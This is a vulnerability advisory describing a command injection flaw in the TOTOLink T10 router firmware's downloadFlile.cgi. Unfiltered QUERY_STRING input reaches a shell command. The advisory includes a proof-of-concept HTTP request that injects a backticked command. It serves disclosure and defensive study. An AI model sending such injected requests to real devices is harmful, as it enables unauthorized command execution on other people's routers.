# TOTOLink T10 V5.9c.5061_B20200511 Has an command injection vulnerability

## Overview

- **Type**: command injection vulnerability
- **Vendor**: TOTOLINK (https://www.totolink.net/)
- **Products**: WiFi Router, such as T10 V5.9c.5061_B20200511
- **Firmware download address:** https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/172/ids/36.html



## Description

### 1.Product Information:

TOTOLink T10 router, the latest version of simulation overview：

![Figure 1 Update date of the latest version of the firmware](images/image-20220212234850675.png)





### 2. Vulnerability details

![Figure 2 Local of file](images/image-20220212235410138.png)

TOTOLink T10 V5.9c.5061_B20200511 was discovered to contain a command injection vulnerability in the "Main" function. This vulnerability allows attackers to execute arbitrary commands via the QUERY_STRING parameter.

![Figure 3 Local of the vulnerability](images/image-20220212235159394.png)

We can see that the os will get ` QUERY_STRING`  without filter splice to the string `echo QUERY_STRING:%s >/tmp/download` and execute it. So, If  we can control the `QUERY_STRING`, it can be command injection.

## 3. Recurring vulnerabilities and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Boot the firmware by qemu-system or other ways (real machine)
2. Attack with the following POC attacks

```
GET /cgi-bin/downloadFlile.cgi?payload=`ls>../1.txt` HTTP/1.1 
Host: 192.168.111.12 
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Connection: keep-alive 
Upgrade-Insecure-Requests: 1 
Cache-Control: max-age=0
```

![Figure 4 POC attack effect](images/22.png)

However response code is 500, the code is still executed successfully

![Figure 5 POC attack effect](images/33.png)

